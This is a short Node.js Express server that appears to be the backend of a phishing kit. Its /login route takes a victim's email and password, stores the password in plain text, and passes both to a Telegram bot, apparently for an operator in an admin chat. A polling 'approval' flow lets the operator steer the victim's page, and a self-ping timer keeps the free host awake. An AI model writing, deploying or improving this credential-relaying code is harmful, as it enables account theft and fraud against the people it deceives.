const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");
const { sendApprovalRequest } = require("./bot");

const BOT_TOKEN = process.env.BOT_TOKEN;
const APP_URL = process.env.APP_URL;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const app = express();
const PORT = process.env.PORT || 3000;

let pendingUsers = {};

// Create bot without polling (webhook mode)
const bot = new TelegramBot(BOT_TOKEN);
bot.setWebHook(`${APP_URL}/bot${BOT_TOKEN}`).then(() => {
  console.log("✅ Telegram webhook set successfully");
}).catch(console.error);

// Add webhook handler endpoint for Telegram
app.use(express.json()); // needed to parse JSON for webhook updates
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.send("✅ Server is running.");
});

app.post("/login", (req, res) => {
  const email = req.body.email.trim().toLowerCase();
  const password = req.body.password;

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login: ${email}`);

  sendApprovalRequest(email, password);

  res.json({ success: true });
});

app.get("/check-status", (req, res) => {
  const email = (req.query.email || '').trim().toLowerCase();

  if (!pendingUsers[email]) return res.json({ status: "unknown" });
  res.json({ status: pendingUsers[email].status });
});

app.post("/update-status", (req, res) => {
  const email = (req.body.email || '').trim().toLowerCase();
  const status = req.body.status;

  console.log("📬 Update Status Received:", email, status);
  console.log("📌 All Users:", pendingUsers);

  if (pendingUsers[email]) {
    pendingUsers[email].status = status;
    console.log("✅ Status updated for:", email);
    return res.json({ ok: true });
  } else {
    console.log("❌ User not found:", email);
    return res.json({ ok: false, message: "User not found" });
  }
});

setInterval(() => {
  const url = `${process.env.APP_URL}`;
  fetch(url).then(() => console.log("🔁 Pinged self to stay awake"));
}, 5 * 60 * 1000);

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
